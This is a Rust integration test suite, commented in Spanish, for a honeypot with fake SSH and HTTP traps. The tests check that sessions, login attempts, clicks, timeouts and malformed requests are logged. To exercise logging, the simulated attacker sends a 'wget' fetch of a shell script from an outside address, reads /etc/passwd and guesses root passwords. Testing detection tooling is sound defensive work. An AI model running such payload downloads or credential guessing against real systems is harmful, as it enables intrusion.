//! Pruebas de extremo a extremo: una sesión real contra las trampas reales, en un puerto
//! efímero de loopback.

use honeypot::log::EventLog;
use honeypot::trap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

fn temp_log(name: &str) -> PathBuf {
    let path = std::env::temp_dir().join(name);
    let _ = std::fs::remove_file(&path);
    path
}

/// Saca el valor de un campo de una línea JSON del registro.
fn campo(linea: &str, clave: &str) -> Option<String> {
    honeypot::log::parse_flat_object(linea).and_then(|campos| {
        campos
            .iter()
            .find(|(nombre, _)| nombre == clave)
            .map(|(_, valor)| valor.clone())
    })
}

/// Lines del registro que contienen el evento indicado.
fn lineas_con_evento(contenido: &str, evento: &str) -> Vec<String> {
    contenido
        .lines()
        .filter(|linea| campo(linea, "event").as_deref() == Some(evento))
        .map(|linea| linea.to_string())
        .collect()
}

fn read_until(stream: &mut TcpStream, buffer: &mut String, marker: &str) -> String {
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        if let Some(index) = buffer.find(marker) {
            let text: String = buffer.drain(..index + marker.len()).collect();
            return text;
        }
        if std::time::Instant::now() > deadline {
            panic!("no apareció la marca {marker} a tiempo");
        }
        let mut chunk = [0u8; 1024];
        match stream.read(&mut chunk) {
            Ok(0) => panic!("la conexión se cerró antes de {marker}"),
            Ok(count) => buffer.push_str(&String::from_utf8_lossy(&chunk[..count])),
            Err(error) => panic!("fallo de lectura esperando {marker}: {error}"),
        }
    }
}

#[test]
fn la_trampa_ssh_registra_la_sesion_completa() {
    let log_path = temp_log("honeypot-it-ssh.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_ssh_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa SSH");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();

    let banner = read_until(&mut stream, &mut buffer, "\n");
    assert!(
        banner.contains("SSH-2.0-OpenSSH"),
        "banner inesperado: {banner}"
    );

    // Dos intentos rechazados y uno aceptado: la trampa deja entrar al atacante para observarlo.
    for password in ["123456", "admin"] {
        read_until(&mut stream, &mut buffer, "login: ");
        stream.write_all(b"root\n").unwrap();
        read_until(&mut stream, &mut buffer, "Password: ");
        stream
            .write_all(format!("{password}\n").as_bytes())
            .unwrap();
        let denial = read_until(&mut stream, &mut buffer, "Permission denied");
        assert!(denial.contains("Permission denied"), "respuesta: {denial}");
    }

    read_until(&mut stream, &mut buffer, "login: ");
    stream.write_all(b"root\n").unwrap();
    read_until(&mut stream, &mut buffer, "Password: ");
    stream.write_all(b"toor\n").unwrap();
    let welcome = read_until(&mut stream, &mut buffer, "root@victima:~# ");
    assert!(welcome.contains("Welcome"), "respuesta: {welcome}");

    stream.write_all(b"uname -a\n").unwrap();
    let answer = read_until(&mut stream, &mut buffer, "root@victima:~# ");
    assert!(answer.contains("Linux victima"), "respuesta: {answer}");

    stream
        .write_all(b"wget http://198.51.100.7/x.sh\n")
        .unwrap();
    read_until(&mut stream, &mut buffer, "root@victima:~# ");

    stream.write_all(b"exit\n").unwrap();
    let mut rest = String::new();
    let _ = stream.read_to_string(&mut rest);

    // Se le da a la trampa un momento para escribir el evento de cierre.
    std::thread::sleep(Duration::from_millis(200));

    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"event\":\"connect\""));
    assert!(content.contains("\"event\":\"login_attempt\""));
    assert!(content.contains("\"result\":\"denied\""));
    assert!(content.contains("\"result\":\"accepted\""));
    assert!(content.contains("\"event\":\"login_accepted\""));
    assert!(content.contains("\"event\":\"command\""));
    assert!(content.contains("\"command\":\"uname -a\""));
    assert!(content.contains("\"event\":\"download_attempt\""));
    assert!(content.contains("\"event\":\"session_end\""));

    // La duración va en milisegundos: media sesión no puede verse como «0s».
    let cierre = lineas_con_evento(&content, "session_end");
    let duracion = campo(&cierre[0], "duration").expect("la sesión debe llevar duración");
    assert!(
        duracion.ends_with("ms"),
        "la duración debe ir en milisegundos: {duracion}"
    );
    let milisegundos: u64 = duracion
        .trim_end_matches("ms")
        .parse()
        .unwrap_or_else(|_| panic!("la duración no es un número de milisegundos: {duracion}"));

    let _ = std::fs::remove_file(&log_path);
    assert!(
        milisegundos < 60_000,
        "la duración no cuadra: {milisegundos} ms"
    );
}

#[test]
fn la_trampa_web_registra_las_credenciales_que_recibe() {
    let log_path = temp_log("honeypot-it-http.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");
    assert!(page.contains("<form"), "falta el formulario: {page}");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let body = "user=admin&password=clave-de-prueba";
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut answer = String::new();
    stream.read_to_string(&mut answer).unwrap();
    assert!(answer.contains("Sesión iniciada"), "respuesta: {answer}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"event\":\"http_get\""));
    assert!(content.contains("\"event\":\"http_post\""));
    assert!(content.contains("\"user\":\"admin\""));
    assert!(content.contains("\"password\":\"clave-de-prueba\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn el_ataque_guionizado_empareja_cada_orden_con_su_respuesta() {
    let log_path = temp_log("honeypot-it-attack.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_ssh_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa SSH");

    let outcome = honeypot::attack::run(
        &address.to_string(),
        &["123456", "admin", "toor"],
        Duration::from_secs(5),
    )
    .expect("el ataque simulado falló");

    assert_eq!(outcome.attempts.len(), 3);
    assert!(outcome.attempts[0].response.contains("Permission denied"));
    assert!(outcome.attempts[1].response.contains("Permission denied"));
    assert!(outcome.attempts[2].response.contains("Welcome"));

    let answer_of = |command: &str| {
        outcome
            .commands
            .iter()
            .find(|(sent, _)| sent == command)
            .map(|(_, response)| response.clone())
            .unwrap_or_else(|| panic!("falta la orden {command}"))
    };
    assert!(answer_of("uname -a").contains("Linux victima"));
    assert!(answer_of("whoami").contains("root"));
    assert!(answer_of("id").contains("uid=0(root)"));
    assert!(answer_of("cat /etc/passwd").contains("root:x:0:0"));

    // La transcripción muestra las respuestas, no el prompt del shell del host falso.
    for (_, response) in &outcome.commands {
        assert!(
            !response.contains("root@victima"),
            "la respuesta todavía trae el prompt: {response}"
        );
    }

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn una_ruta_desconocida_se_contesta_y_se_anota() {
    let log_path = temp_log("honeypot-it-404.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /admin HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut answer = String::new();
    stream.read_to_string(&mut answer).unwrap();
    assert!(answer.starts_with("HTTP/1.1 404"), "respuesta: {answer}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"status\":\"404\""));

    let _ = std::fs::remove_file(&log_path);
}

/// Casos del tope de intentos: (intentos permitidos, pares de credenciales que se
/// envían). El atacante siempre entra igual; cambia cuántas veces se equivoca antes
/// de que la trampa lo cierre.
const CASOS_LIMITE: [(usize, usize); 2] = [(1, 2), (2, 3)];

#[test]
fn el_tope_de_intentos_se_cumple_en_varios_casos() {
    for (max_intentos, pares) in CASOS_LIMITE {
        let log_path = temp_log(&format!("honeypot-it-limite-{max_intentos}.jsonl"));
        let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
        let address = listener.local_addr().expect("no se pudo leer la dirección");

        std::thread::spawn(move || {
            let (stream, _) = listener.accept().expect("no se pudo aceptar");
            honeypot::trap::serve_ssh_session_con_limites(
                stream,
                &log,
                "s-limite",
                max_intentos,
                Duration::from_secs(1),
            );
        });

        let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .unwrap();
        let mut buffer = String::new();
        // Se mandan un par más de los permitidos: el último lo rebasa.
        for numero in 0..pares {
            read_until(&mut stream, &mut buffer, "login: ");
            stream.write_all(b"root\n").unwrap();
            read_until(&mut stream, &mut buffer, "Password: ");
            let password = format!("clave-{numero}\n");
            stream.write_all(password.as_bytes()).unwrap();
        }

        let mut resto = String::new();
        let _ = stream.read_to_string(&mut resto);

        std::thread::sleep(Duration::from_millis(200));
        let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
        assert!(
            content.contains("\"event\":\"limite_intentos\""),
            "debía anotarse el tope de intentos con {max_intentos}: {content}"
        );
        assert!(
            resto.contains("Too many authentication failures"),
            "la sesión tenía que cerrarse con {max_intentos} intentos: {resto}"
        );

        let _ = std::fs::remove_file(&log_path);
    }
}

/// Casos del tiempo agotado: (segundos de silencio, cuánto espera la prueba).
const CASOS_TIEMPO: [(u64, u64); 2] = [(1, 1500), (2, 2600)];

#[test]
fn la_sesion_se_cierra_sola_si_el_atacante_se_queda_callado() {
    for (segundos, espera) in CASOS_TIEMPO {
        let log_path = temp_log(&format!("honeypot-it-timeout-{segundos}.jsonl"));
        let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
        let address = listener.local_addr().expect("no se pudo leer la dirección");

        std::thread::spawn(move || {
            let (stream, _) = listener.accept().expect("no se pudo aceptar");
            honeypot::trap::serve_ssh_session_con_limites(
                stream,
                &log,
                "s-timeout",
                2,
                Duration::from_secs(segundos),
            );
        });

        let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
        let mut buffer = String::new();
        read_until(&mut stream, &mut buffer, "SSH-2.0");
        // No se envía nada: el atacante se queda callado.

        std::thread::sleep(Duration::from_millis(espera));
        let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
        assert!(
            content.contains("\"event\":\"sesion_timeout\""),
            "debía anotarse el tiempo agotado con {segundos} s: {content}"
        );

        let _ = std::fs::remove_file(&log_path);
    }
}

#[test]
fn los_clics_en_la_web_falsa_quedan_registrados() {
    let log_path = temp_log("honeypot-it-clicks.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // Primero se entra con las credenciales.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let cuerpo = "user=admin&password=clave";
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{cuerpo}",
                cuerpo.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut pagina = String::new();
    stream.read_to_string(&mut pagina).unwrap();
    assert!(
        pagina.contains("/cuenta"),
        "el panel debe ofrecer enlaces: {pagina}"
    );

    // Después el atacante "hace clic" en una de esas páginas.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /transferencia HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut clic = String::new();
    stream.read_to_string(&mut clic).unwrap();
    assert!(clic.starts_with("HTTP/1.1 200"), "respuesta: {clic}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_click\""),
        "faltó el clic: {content}"
    );
    assert!(content.contains("\"path\":\"/transferencia\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn una_linea_demasiado_larga_cierra_la_sesion() {
    let log_path = temp_log("honeypot-it-linea.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
    let address = listener.local_addr().expect("no se pudo leer la dirección");

    std::thread::spawn(move || {
        let (stream, _) = listener.accept().expect("no se pudo aceptar");
        honeypot::trap::serve_ssh_session_con_limites(
            stream,
            &log,
            "s-linea",
            10,
            Duration::from_secs(5),
        );
    });

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();
    read_until(&mut stream, &mut buffer, "login: ");
    // 10 000 bytes sin salto de línea: la trampa no puede guardarlos todos.
    stream.write_all(&vec![b'A'; 10_000]).unwrap();

    let mut resto = String::new();
    let _ = stream.read_to_string(&mut resto);

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"linea_demasiada_larga\""),
        "debía anotarse la línea demasiado larga: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn la_sesion_termina_por_plazo_absoluto_aunque_el_atacante_no_calle() {
    let log_path = temp_log("honeypot-it-plazo.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
    let address = listener.local_addr().expect("no se pudo leer la dirección");

    std::thread::spawn(move || {
        let (stream, _) = listener.accept().expect("no se pudo aceptar");
        // Un segundo de plazo: el cliente nunca se queda callado, así que solo el
        // tope absoluto puede cerrar la sesión.
        honeypot::trap::serve_ssh_session_con_limites(
            stream,
            &log,
            "s-plazo",
            10,
            Duration::from_secs(1),
        );
    });

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();
    read_until(&mut stream, &mut buffer, "login: ");

    // El atacante gotea: un byte cada 100 ms, para que el reloj de inactividad
    // nunca se dispare.
    let mut escritor = stream.try_clone().expect("no se pudo duplicar la conexión");
    let goteo = std::thread::spawn(move || {
        for _ in 0..30 {
            std::thread::sleep(Duration::from_millis(100));
            if escritor.write_all(b"x").is_err() {
                break;
            }
        }
    });

    let mut resto = String::new();
    let _ = stream.read_to_string(&mut resto);
    goteo.join().ok();

    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"sesion_timeout\""),
        "debía anotarse el fin de sesión por plazo: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn la_query_string_no_cambia_la_ruta() {
    let log_path = temp_log("honeypot-it-query.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // La raíz con query string es la página de login, no un 404.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /?foo=bar HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");
    assert!(page.contains("<form"), "falta el formulario: {page}");

    // Y el panel con query string también, además de quedar registrado el clic.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /panel?x=1 HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_click\""),
        "debía anotarse el clic en el panel: {content}"
    );
    // En el registro se guarda la ruta completa, con la query string.
    assert!(
        content.contains("\"path\":\"/panel?x=1\""),
        "la ruta original debe quedar en el registro: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

/// Un cuerpo que no cabe: la trampa lo rechaza con 413 en vez de truncarlo en silencio.
#[test]
fn un_cuerpo_demasiado_grande_se_rechaza_con_413() {
    let log_path = temp_log("honeypot-it-413.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // El cuerpo declarado supera con mucho el máximo admitido (4096 bytes).
    let cuerpo = format!("user=admin&password={}", "x".repeat(5000));
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{cuerpo}",
                cuerpo.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut respuesta = String::new();
    let _ = stream.read_to_string(&mut respuesta);
    assert!(
        respuesta.starts_with("HTTP/1.1 413"),
        "la respuesta debe ser 413: {respuesta}"
    );

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_cuerpo_demasiado_grande\""),
        "debía anotarse que el cuerpo era demasiado grande: {content}"
    );
    // Y no debe anotarse un login: el cuerpo no se leyó entero, así que no hay credenciales.
    assert!(
        !content.contains("\"event\":\"http_post\""),
        "no debe anotarse un login con el cuerpo truncado: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

/// Un cuerpo enviado por trozos: se ensambla y se registra como un login normal.
#[test]
fn un_cuerpo_por_trozos_se_registra_como_un_login() {
    let log_path = temp_log("honeypot-it-chunked.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let cuerpo = "user=admin&password=clave-de-prueba";
    let corte = cuerpo.len() / 2;
    let peticion = format!(
        "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n{:x}\r\n{}\r\n{:x}\r\n{}\r\n0\r\n\r\n",
        corte,
        &cuerpo[..corte],
        cuerpo.len() - corte,
        &cuerpo[corte..]
    );

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream.write_all(peticion.as_bytes()).unwrap();
    let mut respuesta = String::new();
    let _ = stream.read_to_string(&mut respuesta);
    assert!(
        respuesta.contains("Sesión iniciada"),
        "la respuesta debe ser la del panel: {respuesta}"
    );

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_post\""),
        "faltó el login: {content}"
    );
    assert!(
        content.contains("\"user\":\"admin\""),
        "faltó el usuario: {content}"
    );
    assert!(
        content.contains("\"password\":\"clave-de-prueba\""),
        "faltó la contraseña: {content}"
    );
    // El cuerpo sí es UTF-8 válido: no hace falta duplicarlo en hexadecimal.
    assert!(
        !content.contains("cuerpo_hex"),
        "no debe añadirse el hexadecimal de un cuerpo válido: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

/// Un `chunked` que se pasa del máximo también se rechaza con 413.
#[test]
fn un_cuerpo_por_trozos_demasiado_grande_se_rechaza_con_413() {
    let log_path = temp_log("honeypot-it-chunked-413.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // Un solo trozo de 4097 bytes: ya supera el máximo admitido.
    let mut peticion = b"POST /login HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n1001\r\n".to_vec();
    peticion.extend(std::iter::repeat(b'x').take(4097));

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream.write_all(&peticion).unwrap();
    let mut respuesta = String::new();
    let _ = stream.read_to_string(&mut respuesta);
    assert!(
        respuesta.starts_with("HTTP/1.1 413"),
        "la respuesta debe ser 413: {respuesta}"
    );

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_cuerpo_demasiado_grande\""),
        "debía anotarse que el cuerpo era demasiado grande: {content}"
    );
    assert!(
        !content.contains("\"event\":\"http_post\""),
        "no debe anotarse un login con el cuerpo truncado: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

/// Un `chunked` mal formado cierra la sesión con un error claro, sin panic.
#[test]
fn un_cuerpo_por_trozos_mal_formado_cierra_la_sesion_con_un_error() {
    // (petición, motivo) dos formas de romper el tamaño de los trozos.
    let casos = [
        ("zz\r\nabc\r\n0\r\n\r\n", "hexadecimal"),
        ("10\r\nabc\r\n0\r\n\r\n", "no cuadra"),
    ];

    for (indice, (cuerpo, motivo)) in casos.iter().enumerate() {
        let log_path = temp_log(&format!("honeypot-it-chunked-mal-{indice}.jsonl"));
        let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
        // Se sirve la sesión con un plazo corto: el cuerpo que miente sobre su
        // tamaño no llega nunca, así que no se espera al plazo largo de la trampa.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
        let address = listener.local_addr().expect("no se pudo leer la dirección");
        std::thread::spawn(move || {
            let (stream, _) = listener.accept().expect("no se pudo aceptar");
            honeypot::trap::serve_http_session_con_tiempo(
                stream,
                &log,
                "h-chunked",
                Duration::from_secs(2),
            );
        });

        let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
        stream
            .write_all(
                format!(
                    "POST /login HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n{cuerpo}"
                )
                .as_bytes(),
            )
            .unwrap();
        let mut resto = String::new();
        let _ = stream.read_to_string(&mut resto);

        std::thread::sleep(Duration::from_millis(200));
        let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
        assert!(
            content.contains("\"event\":\"http_cuerpo_invalido\""),
            "debía anotarse el cuerpo inválido: {content}"
        );
        assert!(
            content.contains(motivo),
            "el motivo debe explicar el fallo ({motivo}): {content}"
        );
        assert!(
            !content.contains("\"event\":\"http_post\""),
            "no debe anotarse un login: {content}"
        );

        let _ = std::fs::remove_file(&log_path);
    }
}

/// Un cuerpo con bytes que no son UTF-8 se guarda además en hexadecimal exacto.
#[test]
fn un_cuerpo_no_utf8_guarda_el_hexadecimal_exacto() {
    let log_path = temp_log("honeypot-it-hex.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // «se\xf1or» lleva un byte que no es UTF-8 válido.
    let cuerpo: Vec<u8> = b"user=root&password=se\xf1or".to_vec();
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                cuerpo.len()
            )
            .as_bytes(),
        )
        .unwrap();
    stream.write_all(&cuerpo).unwrap();
    let mut respuesta = String::new();
    let _ = stream.read_to_string(&mut respuesta);

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_post\""),
        "faltó el login: {content}"
    );

    let lineas = lineas_con_evento(&content, "http_post");
    let hex = campo(&lineas[0], "cuerpo_hex").expect("debe guardarse el cuerpo en hexadecimal");
    assert_eq!(
        hex, "757365723d726f6f742670617373776f72643d7365f16f72",
        "el hexadecimal debe ser exacto, en minúsculas y sin espacios"
    );
    assert!(
        !hex.contains(' ') && !hex.chars().any(|c| c.is_ascii_uppercase()),
        "el hexadecimal va en minúsculas y sin espacios: {hex}"
    );

    let _ = std::fs::remove_file(&log_path);
}
